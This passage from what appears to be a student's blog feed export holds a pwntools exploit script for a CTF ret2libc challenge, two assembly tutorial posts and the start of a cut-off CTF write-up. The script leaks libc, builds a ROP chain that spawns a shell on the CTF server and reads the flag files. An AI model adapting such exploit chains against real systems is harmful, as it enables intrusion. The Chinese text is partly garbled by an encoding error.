class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">warnings.filterwarnings(<span class="string">&quot;ignore&quot;</span>, category=BytesWarning)</span><br><span class="line"></span><br><span class="line"><span class="comment"># r = process(&#x27;./chal&#x27;)</span></span><br><span class="line">r= remote(<span class="string">&#x27;140.116.246.190&#x27;</span>,<span class="number">8789</span>)</span><br><span class="line"></span><br><span class="line">l = ELF(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># printf åœ¨è¨­å®šrdiæ™‚ æ˜¯ç”¨ mov rdi, rax</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line">detmclone = <span class="number">0x4010d0</span> <span class="comment"># æœƒæŠŠraxè¨­æˆ stdout</span></span><br><span class="line">mov_rdi_rax = <span class="number">0x4011c5</span></span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x404100</span></span><br><span class="line"></span><br><span class="line">p = flat(</span><br><span class="line">    <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>,</span><br><span class="line">    bss,</span><br><span class="line">    ret,</span><br><span class="line">    detmclone,</span><br><span class="line">    mov_rdi_rax</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;2024?&#x27;</span>,p)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;stdout -&gt; %s&quot;</span> % <span class="built_in">hex</span>(l.symbols[<span class="string">&#x27;stdout&#x27;</span>]))</span><br><span class="line">l.address = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>)) - <span class="number">0x21A780</span></span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;base address -&gt; %s&quot;</span> % <span class="built_in">hex</span>(l.address)) </span><br><span class="line"></span><br><span class="line">pop_rdi = l.address + <span class="number">0x2a3e5</span></span><br><span class="line">pop_rsi = l.address + <span class="number">0x2be51</span></span><br><span class="line">pop_rax = l.address + <span class="number">0x45eb0</span></span><br><span class="line">pop_rdx_rbx = l.address + <span class="number">0x90529</span></span><br><span class="line">syscall = l.address + <span class="number">0x29db4</span></span><br><span class="line">sh = l.address + <span class="number">0x1D8698</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;sh: %s&quot;</span> % <span class="built_in">hex</span>(sh))</span><br><span class="line"></span><br><span class="line">p2 = flat(</span><br><span class="line">    <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>,</span><br><span class="line">    pop_rdi,</span><br><span class="line">    sh,</span><br><span class="line">    pop_rax,</span><br><span class="line">    <span class="number">0x3b</span>,</span><br><span class="line">    pop_rsi,</span><br><span class="line">    <span class="number">0x0</span>,</span><br><span class="line">    pop_rdx_rbx,</span><br><span class="line">    <span class="number">0x0</span>,<span class="number">0x0</span>,</span><br><span class="line">    ret,</span><br><span class="line">    syscall</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line"></span><br><span class="line">r.sendline(p2)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">b&#x27;cat /home/$(whoami)/flag*&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Assembly part 2.</title>
      <link href="/2024/08/15/asm-1/"/>
      <url>/2024/08/15/asm-1/</url>
      
        <content type="html"><![CDATA[<h2 id="Basic-Instructions"><a href="#Basic-Instructions" class="headerlink" title="Basic Instructions"></a>Basic Instructions</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">; Program to show use of interrupts</span><br><span class="line">; Also, Hello World program !</span><br><span class="line">hello: DB &quot;Hello World&quot; ; store string</span><br><span class="line"></span><br><span class="line">; actual entry point of the program, must be present</span><br><span class="line">start:</span><br><span class="line">MOV AH, 0x13            ; move BIOS interrupt number in AH</span><br><span class="line">MOV CX, 11              ; move length of string in cx</span><br><span class="line">MOV BX, 0               ; mov 0 to bx, so we can move it to es</span><br><span class="line">MOV ES, BX              ; move segment start of string to es, 0</span><br><span class="line">MOV BP, OFFSET hello    ; move start offset of string in bp</span><br><span class="line">MOV DL, 0               ; start writing from col 0</span><br><span class="line">int 0x10                ; BIOS interrupt</span><br></pre></td></tr></table></figure></div><h3 id="CMP"><a href="#CMP" class="headerlink" title="CMP"></a>CMP</h3><h4 id="CMPX1-X2-JMP"><a href="#CMPX1-X2-JMP" class="headerlink" title="CMPX1,X2  JMP"></a>CMPX1,X2  <code>JMP</code></h4><ul><li><strong>JE (Jump if Equal):</strong> Jumps if the Zero Flag (ZF) is set (<code>ZF = 1</code>).</li><li><strong>JNE (Jump if Not Equal):</strong> Jumps if the Zero Flag (ZF) is not set (<code>ZF = 0</code>).</li><li><strong>JZ (Jump if Zero):</strong> Jumps if the Zero Flag (ZF) is set (<code>ZF = 1</code>).</li><li><strong>JNZ (Jump if Not Zero):</strong> Jumps if the Zero Flag (ZF) is not set (<code>ZF = 0</code>).</li><li><strong>JS (Jump if Sign):</strong> Jumps if the Sign Flag (SF) is set (<code>SF = 1</code>).</li><li><strong>JNS (Jump if Not Sign):</strong> Jumps if the Sign Flag (SF) is not set (<code>SF = 0</code>).</li><li><strong>JC (Jump if Carry):</strong> Jumps if the Carry Flag (CF) is set (<code>CF = 1</code>).</li><li><strong>JNC (Jump if Not Carry):</strong> Jumps if the Carry Flag (CF) is not set (<code>CF = 0</code>).</li><li><strong>JO (Jump if Overflow):</strong> Jumps if the Overflow Flag (OF) is set (<code>OF = 1</code>).</li><li><strong>JNO (Jump if Not Overflow):</strong> Jumps if the Overflow Flag (OF) is not set (<code>OF = 0</code>).</li><li><strong>JA (Jump if Above):</strong> Jumps if (<code>CF = 0</code> and <code>ZF = 0</code>).</li><li><strong>JAE (Jump if Above or Equal):</strong> Jumps if (<code>CF = 0</code>).</li><li><strong>JNA (Jump if Not Above):</strong> Jumps if (<code>CF = 1</code> and <code>ZF = 1</code>).</li><li><strong>JNAE (Jump if Not Above or Equal):</strong> Jumps if (<code>CF = 1</code>).</li><li><strong>JG (Jump if Greater):</strong> Jumps if (<code>ZF = 0</code> and <code>SF = OF</code>).</li><li><strong>JGE (Jump if Greater or Equal):</strong> Jumps if (<code>SF = OF</code>).</li><li><strong>JNG (Jump if Not Greater):</strong> Jumps if (<code>ZF = 1</code> or <code>SF != OF</code>).</li><li><strong>JNGE (Jump if Not Greater or Equal):</strong> Jumps if (<code>SF != OF</code>).</li><li><strong>JB (Jump if Below):</strong> Jumps if (<code>CF = 1</code>).</li><li><strong>JBE (Jump if Below or Equal):</strong> Jumps if (<code>CF = 1</code> or <code>ZF = 1</code>).</li><li><strong>JNB (Jump if Not Below):</strong> Jumps if (<code>CF = 0</code>).</li><li><strong>JNBE (Jump if Not Below or Equal):</strong> Jumps if (<code>CF = 0</code> and <code>ZF = 0</code>).</li><li><strong>JL (Jump if Less):</strong> Jumps if (<code>SF != OF</code>).</li><li><strong>JLE (Jump if Less or Equal):</strong> Jumps if (<code>SF != OF</code> or <code>ZF = 1</code>).</li><li><strong>JNL (Jump if Not Less):</strong> Jumps if (<code>SF = OF</code>).</li><li><strong>JNLE (Jump if Not Less or Equal):</strong> Jumps if (<code>SF = OF</code> and <code>ZF = 0</code>).</li><li><strong>JP&#x2F;JPE (Jump if Parity&#x2F;Even Parity):</strong> Jumps if Parity Flag (PF) is set (<code>PF = 1</code>).</li><li><strong>JNP&#x2F;JPO (Jump if Not Parity&#x2F;Odd Parity):</strong> Jumps if Parity Flag (PF) is not set (<code>PF = 0</code>).</li></ul><h3 id="Integer-Addition-and-Subtraction"><a href="#Integer-Addition-and-Subtraction" class="headerlink" title="Integer Addition and Subtraction"></a>Integer Addition and Subtraction</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">start:</span><br><span class="line">mov al, 5</span><br><span class="line">mov cl, 2</span><br><span class="line">add al,cl</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">start:</span><br><span class="line">mov dx, 0</span><br><span class="line">mov ax, 0083</span><br><span class="line">mov bx, 2</span><br><span class="line">div bx</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">start:</span><br><span class="line">mov ah, 255</span><br><span class="line">mov bh, 254</span><br><span class="line">xor ah, bh</span><br></pre></td></tr></table></figure></div><ul><li>Operation List</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ADD X1,X2    ;å°‡X1 X2çš„æ•¸å­—ç›¸åŠ ä¸¦å­˜å…¥X1ä¸­</span><br><span class="line">SUB X1,X2    ;åŒ ä¸Š ï¼Œåª æ˜¯ è®Š æ¸› æ³• MUL BXAXå»ä¹˜BX</span><br><span class="line">INC X1     ;X1çš„æ•¸å­—åŠ 1 ï¼Œä¸¦æ”¾å›X1 D E C X 1 åŒ ä¸Š ï¼Œä½† è®Š æ¸› 1</span><br><span class="line">NEG X1     ;å°‡X1çš„æ•¸å­—è®Šç‚º2çš„è£œæ•¸</span><br><span class="line">OR X1,X2     ;X1,X2 å»åšORé‚è¼¯é‹ç®—ï¼Œä¸¦å°‡çµæœæ”¾å›X1</span><br><span class="line">AND X1,X2     ;åŒä¸Šåªæ˜¯å»åšANDé‚è¼¯é‹ç®—</span><br><span class="line">TEST X1,X2     ;åŒä¸Šï¼Œä»–æ˜¯å»åšANDé‚è¼¯é‹ç®—ä½†æ¯”è¼ƒç‰¹æ®Šçš„æ˜¯ä»–ä¸æœƒæŠŠçµæœå­˜å…¥X1ä¸­</span><br><span class="line">END     ;è¡¨ç¤ºç¨‹å¼çµæŸè™• DB[å­—ä¸²ï¼Œæ•¸å€¼]å»å®šç¾©ä¸€å€‹ä½å…ƒçµ„çš„è³‡æ–™ä¸å½±éŸ¿æ——æ¨™çš„ç¨‹å¼=ã€‰</span><br><span class="line">            ;ç§»å‹•è³‡æ–™çš„ç¨‹å¼(è¨»è¨˜ç¢¼) like: MOV AX,BX/POP AX/PUSH AX</span><br></pre></td></tr></table></figure></div><h2 id="Exam"><a href="#Exam" class="headerlink" title="Exam"></a>Exam</h2><p><a class="link"   href="https://hackmd.io/54U7j1vaR7ebbLQtVb4FNQ" >EM1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   href="https://hackmd.io/cVT7YTEgRw22Vab8npsRqA" >EM2 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>]]></content>
      
      
      
        <tags>
            
            <tag> csie </tag>
            
            <tag> asm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Assembly part 1.</title>
      <link href="/2024/08/15/asm/"/>
      <url>/2024/08/15/asm/</url>
      
        <content type="html"><![CDATA[<blockquote><p>Ref: <a class="link"   href="https://yassinebridi.github.io/asm-docs/asm_tutorial_01.html" >ASM tutorial <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p></blockquote><h2 id="X86-CPU-Architecture"><a href="#X86-CPU-Architecture" class="headerlink" title="X86 CPU Architecture"></a>X86 CPU Architecture</h2><p><a class="link"   href="https://file.notion.so/f/f/cb883e80-075d-476a-b401-88c14fc6ecf4/f1ba7bfb-33c8-4cda-b60a-e2dd7eee6b5e/X86-Registers_and_Addressing_Modes.pdf?id=8e447b5d-09af-4fec-9996-c40a81ae1501&table=block&spaceId=cb883e80-075d-476a-b401-88c14fc6ecf4&expirationTimestamp=1698393600000&signature=ndENqs06GLxSo-Vs7JULZGqZueNbo3JzsQcyhQJv9gs&downloadName=X86-Registers+and+Addressing+Modes.pdf" >X86-Registers and Addressing Modes.pdf <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h3 id="Register"><a href="#Register" class="headerlink" title="Register"></a>Register</h3><h4 id="General-Purpose-Register"><a href="#General-Purpose-Register" class="headerlink" title="General Purpose Register"></a>General Purpose Register</h4><table><thead><tr><th>æš«å­˜å™¨</th><th>ç´¯åŠ å™¨</th><th>è¨ˆæ•¸å™¨</th><th>è³‡æ–™</th><th>åŸºå€</th><th>å †ç–ŠæŒ‡æ¨™</th><th>æ£§åŸºå€æŒ‡æ¨™</th><th>æºè®Šå€</th><th>ç›®æ¨™ç´¢å¼•</th></tr></thead><tbody><tr><td>64-bit</td><td>RAX</td><td>RCX</td><td>RDX</td><td>RBX</td><td>RSP</td><td>RBP</td><td>RSI</td><td>RDI</td></tr><tr><td>32-bit</td><td>EAX</td><td>ECX</td><td>EDX</td><td>EBX</td><td>ESP</td><td>EBP</td><td>ESI</td><td>EDI</td></tr><tr><td>16-bit</td><td>AX</td><td>CX</td><td>DX</td><td>BX</td><td>SP</td><td>BP</td><td>SI</td><td>DI</td></tr><tr><td>8-bit</td><td>AH  AL</td><td>CH   CL</td><td>DH   DL</td><td>BH  BL</td><td></td><td></td><td></td><td></td></tr></tbody></table><ul><li>AXï¼šç´¯åŠ å™¨(Accumulator)ï¼Œç”¨æ–¼ç®—è¡“å’Œé‹ç®—ã€‚</li><li>BXï¼šåŸºå€å¯„å­˜å™¨(Base)ï¼Œé€šå¸¸ç”¨æ–¼æŒ‡å‘æ•¸çµ„æˆ–æ•¸æ“šå€åŸŸã€‚</li><li>CXï¼šè¨ˆæ•¸å™¨(Counter)ï¼Œé€šå¸¸ç”¨æ–¼è¿´åœˆè¨ˆæ•¸ã€‚</li><li>DXï¼šæ•¸æ“šå¯„å­˜å™¨(Data, IO)ï¼Œç”¨æ–¼ I&#x2F;O æ“ä½œã€‚</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">4 å€‹é€šç”¨æš«å­˜å™¨ï¼ˆAXã€BXã€CXã€DXï¼‰ç”±å…©å€‹ç¨ç«‹çš„ 8 ä½å…ƒæš«å­˜å™¨çµ„æˆï¼Œ</span><br><span class="line">ä¾‹å¦‚å¦‚æœ AX= 00110000 00111001 bï¼Œå‰‡ AH= 00110000 b ä¸” AL= 00111001 bã€‚</span><br><span class="line">å› æ­¤ï¼Œç•¶æ‚¨ä¿®æ”¹ä»»ä½• 8 ä½å…ƒæš«å­˜å™¨æ™‚ï¼Œ16 ä½å…ƒæš«å­˜å™¨ä¹Ÿæœƒæ›´æ–°ï¼Œåä¹‹äº¦ç„¶ã€‚</span><br><span class="line">å…¶ä»–3å€‹æš«å­˜å™¨ä¹Ÿæ˜¯å¦‚æ­¤ï¼Œã€ŒHã€ç‚ºé«˜ä½ï¼Œã€ŒLã€ç‚ºä½ä½ã€‚</span><br></pre></td></tr></table></figure></div><h3 id="Segment-Register-å€æ®µå¯„å­˜å™¨"><a href="#Segment-Register-å€æ®µå¯„å­˜å™¨" class="headerlink" title="Segment Register : å€æ®µå¯„å­˜å™¨"></a>Segment Register : å€æ®µå¯„å­˜å™¨</h3><table><thead><tr><th>æš«å­˜å™¨åˆ¥å</th><th>æš«å­˜å™¨</th><th>Size</th></tr></thead><tbody><tr><td>ç¨‹å¼å€æ®µæš«å­˜å™¨</td><td>CS</td><td>16-bits</td></tr><tr><td>è³‡æ–™å€æ®µæš«å­˜å™¨</td><td>DS</td><td>16-bits</td></tr><tr><td>é¡å¤–å€æ®µæš«å­˜å™¨</td><td>ES</td><td>16-bits</td></tr><tr><td>å †ç–Šå€æ®µæš«å­˜å™¨</td><td>SS</td><td>16-bits</td></tr></tbody></table><ul><li><p>CSï¼šä»£ç¢¼æ®µå¯„å­˜å™¨ï¼Œå­˜å„²ä»£ç¢¼æ®µçš„åç§»åœ°å€ã€‚</p></li><li><p>DSï¼šæ•¸æ“šæ®µå¯„å­˜å™¨ï¼Œå­˜å„²æ•¸æ“šæ®µçš„åç§»åœ°å€ã€‚</p></li><li><p>SSï¼šå †æ£§æ®µå¯„å­˜å™¨ï¼Œå­˜å„²å †æ£§æ®µçš„åç§»åœ°å€ã€‚</p></li><li><p>ESï¼šé¡å¤–æ®µå¯„å­˜å™¨ï¼Œé€šå¸¸ç”¨æ–¼é¡å¤–æ•¸æ“šæ®µçš„åç§»åœ°å€ã€‚</p></li><li><p><code>é‚è¼¯ä½å€â†’ç·šæ€§ä½å€ï¼ˆå¯¦éš›ä½ç½®ï¼‰</code>ï¼Œå…¬å¼æ˜¯ï¼šã€ŒSegment Register * 0x10 + Offsetã€</p></li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">æ®µå¯„å­˜å™¨çš„ç‰¹æ®Šç”¨é€”ï¼šæ®µå¯„å­˜å™¨ä¸åŒæ–¼é€šç”¨å¯„å­˜å™¨ï¼Œå®ƒå€‘æœ‰ä¸€å€‹ç‰¹æ®Šçš„ç”¨é€”ï¼Œå³æŒ‡å‘å¯ä»¥å­˜å–çš„è¨˜æ†¶é«”å€å¡Šã€‚æ¯å€‹æ®µå¯„å­˜å™¨éƒ½ä»£è¡¨äº†ä¸€å€‹è¨˜æ†¶é«”æ®µï¼ˆmemory segmentï¼‰ï¼Œè€Œä¸æ˜¯å–®å€‹æ•¸å€¼ã€‚</span><br><span class="line"></span><br><span class="line">èˆ‡é€šç”¨æš«å­˜å™¨çš„çµåˆï¼šç‚ºäº†å­˜å–è¨˜æ†¶é«”ä¸­çš„æ•¸æ“šï¼Œä½ éœ€è¦ä½¿ç”¨æ®µå¯„å­˜å™¨èˆ‡é€šç”¨å¯„å­˜å™¨ä¸€èµ·å·¥ä½œã€‚ä¾‹å¦‚ï¼Œå¦‚æœä½ æƒ³è¦è¨ªå•è¨˜æ†¶é«”ä¸­çš„æŸå€‹ä½ç½®ï¼Œæ¯”å¦‚ç‰©ç†ä½å€12345hï¼ˆåå…­é€²ä½ï¼‰ï¼Œä½ æ‡‰è©²å°‡æ®µå¯„å­˜å™¨DSè¨­ç½®ç‚º1230hï¼Œä¸¦å°‡é€šç”¨å¯„å­˜å™¨SIè¨­ç½®ç‚º0045hã€‚é€™æ¨£çš„çµ„åˆå¯ä»¥ç”¨ä¾†è¨ˆç®—å¯¦éš›çš„è¨˜æ†¶é«”åœ°å€ã€‚</span><br><span class="line"></span><br><span class="line">è¨ˆç®—å¯¦é«”ä½å€ï¼š8086è™•ç†å™¨é€šéå°‡æ®µå¯„å­˜å™¨çš„å€¼å·¦ç§»å››ä½ï¼ˆä¹˜ä»¥10hï¼Œä¹Ÿå°±æ˜¯16ï¼‰ï¼Œç„¶å¾ŒåŠ ä¸Šé€šç”¨å¯„å­˜å™¨çš„å€¼ï¼Œä¾†è¨ˆç®—å¯¦éš›çš„è¨˜æ†¶é«”ä½å€ã€‚åœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ï¼ŒDS * 10h + SI çš„çµæœå°‡æ˜¯12345hï¼Œé€™æ˜¯ä½ æƒ³è¦è¨ªå•çš„ç‰©ç†ä½å€ã€‚</span><br></pre></td></tr></table></figure></div><h3 id="Pointer-Register-æŒ‡æ¨™æš«å­˜å™¨"><a href="#Pointer-Register-æŒ‡æ¨™æš«å­˜å™¨" class="headerlink" title="Pointer Register : æŒ‡æ¨™æš«å­˜å™¨"></a>Pointer Register : æŒ‡æ¨™æš«å­˜å™¨</h3><table><thead><tr><th>æš«å­˜å™¨åˆ¥å</th><th>æš«å­˜å™¨</th><th>é è¨­çš„å€æ®µæš«å­˜å™¨</th><th>Size (bits)</th></tr></thead><tbody><tr><td>ä¾†æºç´¢å¼•æš«å­˜å™¨</td><td>ESI , SI</td><td></td><td>32 , 16</td></tr><tr><td>ç›®çš„ç´¢å¼•æš«å­˜å™¨</td><td>EDI , DI</td><td></td><td>32 , 16</td></tr><tr><td>å †ç–ŠæŒ‡æ¨™æš«å­˜å™¨</td><td>ESP , SP</td><td>SS</td><td>32 , 16</td></tr><tr><td>åŸºåº•æŒ‡æ¨™æš«å­˜å™¨</td><td>EBP , BP</td><td></td><td>32 , 16</td></tr><tr><td>ç¨‹å¼æŒ‡æ¨™æš«å­˜å™¨</td><td>EIP , IP</td><td>CS</td><td>32 , 16</td></tr></tbody></table><h4 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h4><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://hackmd.io/_uploads/r13Oycwf6.png"                      alt="image"                ></p><table><thead><tr><th>Flag</th><th>Function</th></tr></thead><tbody><tr><td>Zero flag é›¶æ™‚æ——æ¨™ :zero:</td><td>set to 1 if result &#x3D;0 ,set to 0 otherwise.</td></tr><tr><td>Sign flag è² è™Ÿ</td><td>set to 1 if result &lt;0 ,set to 0 otherwise.</td></tr><tr><td>Carry flag</td><td>Carry out of a binary operation.</td></tr><tr><td>Parity flag</td><td>set to 1 if the number of 1â€™s in a result is odd,set to 0 otherwise.</td></tr><tr><td>Overflow flag</td><td>set to 1 if thereâ€™s a 2â€™s came overflow</td></tr><tr><td>Half carry flag</td><td>Contains carry from the least sig Foour bits</td></tr><tr><td>Direction flag</td><td>STD set to 1 , CLD set to 0</td></tr></tbody></table><h3 id="Addressing-modes"><a href="#Addressing-modes" class="headerlink" title="Addressing modes"></a>Addressing modes</h3><h4 id="æš«å­˜å™¨å®šå€æ³•"><a href="#æš«å­˜å™¨å®šå€æ³•" class="headerlink" title="æš«å­˜å™¨å®šå€æ³•"></a>æš«å­˜å™¨å®šå€æ³•</h4><ul><li>ç”¨æš«å­˜å™¨çš„ä½å€ç•¶ä½œæŒ‡ä»¤çš„ä½å€ï¼ŒæŒ‡ä»¤çš„ä½å€ç”±æš«å­˜å™¨çš„ä½å€æ±ºå®šã€‚</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">EX:</span><br><span class="line">  MOV AX,BX</span><br></pre></td></tr></table></figure></div><h4 id="ç«‹å³å®šå€æ³•"><a href="#ç«‹å³å®šå€æ³•" class="headerlink" title="ç«‹å³å®šå€æ³•"></a>ç«‹å³å®šå€æ³•</h4><ul><li>æŠŠè³‡æ–™æ”¾åœ¨æŒ‡ä»¤ä¸­ï¼Œä¸éœ€è¦å»è®€å–è¨˜æ†¶é«”ä¸­çš„è³‡æ–™ã€‚</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">EX:</span><br><span class="line">  MOV AX,111b</span><br></pre></td></tr></table></figure></div><h4 id="ç›´æ¥å®šå€æ³•"><a href="#ç›´æ¥å®šå€æ³•" class="headerlink" title="ç›´æ¥å®šå€æ³•"></a>ç›´æ¥å®šå€æ³•</h4><ul><li>ç›´æ¥çµ¦å®šè³‡æ–™çš„è¨˜æ†¶é«”å¯¦éš›ä½å€(ç‰©ç†ä½ç½®)ï¼Œç›´æ¥è®€å–è¨˜æ†¶é«”ä¸­çš„è³‡æ–™ã€‚</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">EX:</span><br><span class="line">  MOV AX,[001H]</span><br></pre></td></tr></table></figure></div><h4 id="é–“æ¥å®šå€æ³•"><a href="#é–“æ¥å®šå€æ³•" class="headerlink" title="é–“æ¥å®šå€æ³•"></a>é–“æ¥å®šå€æ³•</h4><ul><li>æŒ‡ä»¤çš„é‹ç®—å…ƒæ¬„å…§çš„å€¼ç‚ºæœ‰æ•ˆä½å€çš„ä½å€å€¼ï¼Œæ•…éœ€åšäºŒæ¬¡çš„è¨˜æ†¶é«”è®€å–ï¼Œä»¥å–å¾—æ‰€éœ€ä¹‹è³‡æ–™ã€‚(æœ‰é»é¡ä¼¼C++æŒ‡æ¨™)</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">EX:</span><br><span class="line">  MOV AX,[BX]</span><br></pre></td></tr></table></figure></div><h4 id="åŸºåº•å®šå€æ³•"><a href="#åŸºåº•å®šå€æ³•" class="headerlink" title="åŸºåº•å®šå€æ³•"></a>åŸºåº•å®šå€æ³•</h4><ul><li>ä½¿ç”¨åŸºåº•æš«å­˜å™¨(BX)åŠ ä¸Šä½å€åç§»é‡(Offset)çš„æ–¹å¼ä¾†å®šå€ã€‚</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">EX:</span><br><span class="line">  MOV AX,[BX+0D5H]</span><br></pre></td></tr></table></figure></div><h4 id="ç´¢å¼•å®šå€æ³•"><a href="#ç´¢å¼•å®šå€æ³•" class="headerlink" title="ç´¢å¼•å®šå€æ³•"></a>ç´¢å¼•å®šå€æ³•</h4><ul><li>ç´¢å¼•å®šå€æ³•æ˜¯ä»¥å›ºå®šçš„åœ°å€åŠ ä¸Šç´¢å¼•æš«å­˜å™¨(SI,DI)çš„å€¼ï¼Œä¾†å¾—å‡ºä½ç½®ã€‚(é€šå¸¸ç”¨æ–¼é™£åˆ—)</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">EX:</span><br><span class="line">  MOV AX,[0000H+SI]</span><br></pre></td></tr></table></figure></div><h4 id="åŸºåº•ç´¢å¼•å®šå€æ³•"><a href="#åŸºåº•ç´¢å¼•å®šå€æ³•" class="headerlink" title="åŸºåº•ç´¢å¼•å®šå€æ³•"></a>åŸºåº•ç´¢å¼•å®šå€æ³•</h4><ul><li>åŸºåº•ç´¢å¼•å®šå€æ³•æ˜¯ä»¥åŸºåº•æš«å­˜å™¨(BX)åŠ ä¸Šç´¢å¼•æš«å­˜å™¨(SI,DI)çš„å€¼ï¼Œä¾†å¾—å‡ºä½ç½®ã€‚(é€šå¸¸ç”¨æ–¼2ç¶­é™£åˆ—)</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">EX:</span><br><span class="line">  MOV AX,[BX+SI+2]</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      
        <tags>
            
            <tag> csie </tag>
            
            <tag> asm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NCKUCTF ret2libc_adv WriteUp</title>
      <link href="/2024/08/11/ncku/"/>
      <url>/2024/08/11/ncku/</url>
      
        <content type="html"><![CDATA[<h2 id="ret2libc-adv"><a href="#ret2libc-adv" class="headerlink" title="ret2libc_adv"></a>ret2libc_adv</h2><p><code>b&#39;a&#39;*0x28</code> overflow å¾Œï¼ŒæŠŠ leak çš„chain å¯«å…¥ï¼Œç„¶å¾Œå¯«å›mainå¾Œä½¿ç”¨libcä¸­çš„æ±è¥¿<br>é€™é¡Œå› ç‚º <a href="https://chihhhs.github.io/2024/08/05/pwn-1/#Lazy-Binding">lazy bindding</a> æ‰€ä»¥æˆ‘å€‘ä¸èƒ½ä½¿ç”¨<code>printf</code>å®ƒä¾†leak base address</p><h3 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 